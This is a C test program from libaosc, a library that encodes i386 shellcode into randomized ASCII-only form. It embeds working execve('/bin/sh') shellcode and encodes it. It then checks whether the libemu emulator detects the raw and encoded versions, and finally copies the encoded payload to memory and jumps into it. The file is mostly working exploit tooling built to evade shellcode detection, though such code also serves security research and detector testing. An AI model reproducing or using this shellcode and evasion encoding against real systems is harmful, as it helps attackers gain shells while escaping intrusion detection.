/* libaosc, an encoding library for randomized i386 ASCII-only shellcode.
 *
 * Dedicated to Kanna Ishihara
 *
 * Copyright (C) 2007-2009 Ronald Huizer
 *
 * This library is free software; you can redistribute it and/or modify
 * it under the terms of the GNU Lesser General Public License as
 * published by the Free Software Foundation; either version 2 of
 * the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public
 * License along with this library; if not, write to the Free Software
 * Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <stdint.h>
#include <emu/emu.h>
#include <emu/emu_log.h>
#include <emu/emu_shellcode.h>
#include <emu/emu_memory.h>
#include "i386_ascii.h"
#include "wrapper.h"

#define MAX_NOPS 1000

char shellcode[]=
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

int main(void)
{
	struct emu *emu;
	shellcode_t code, ascii_cruft;
	address ret_addy = (address)xmalloc(31337);
	unsigned int foo, bar, numnops;

	xrandom_init();
	numnops = xrandom_range(0, 1000);
	foo = xrandom_range(0, numnops);
	bar = xrandom_range(0, numnops);

	code.shellcode = shellcode;
	code.size = sizeof(shellcode) - 1;

	/*
	 * aos_encode() the shellcode code, with a return address of
	 * 'ret_addy' and use NUMNOPS nops
	 */
	ascii_cruft = aos_encode_safe(code, ret_addy + foo, numnops);

	code.shellcode = shellcode;
	code.size = sizeof(shellcode) - 1;

	emu = emu_new();
	emu_log_level_set(emu_logging_get(emu),EMU_LOG_DEBUG);
	printf("Running libemu shellcode test:\n");
	if ( emu_shellcode_test(emu, (uint8_t *)code.shellcode, code.size) >= 0 )
		printf("\tnormal shellcode was detected!\n");
	else
		printf("\tnormal shellcode went undetected!\n");
	
	emu_memory_clear(emu_memory_get(emu));

	printf("Running libemu shellcode test on AOcode:\n");
	if ( emu_shellcode_test(emu, (uint8_t *)ascii_cruft.shellcode, ascii_cruft.size) >= 0 )
		printf("\tlibaosc shellcode was detected!\n");
	else
		printf("\tlibaosc shellcode went undetected!\n");

	emu_free(emu);

	printf("Executing shellcode:\n\n");
	printf("%s\n", ascii_cruft.shellcode);
	printf("\nReturn address: 0x%.8x - Encoded return address: 0x%.8x\n",
					 ret_addy + bar, ret_addy + foo);
	fflush(stdout);

	memcpy((void *)ret_addy, ascii_cruft.shellcode, ascii_cruft.size);
	free(ascii_cruft.shellcode);


	((void(*)())ret_addy + bar)();
	return(EXIT_FAILURE);
}
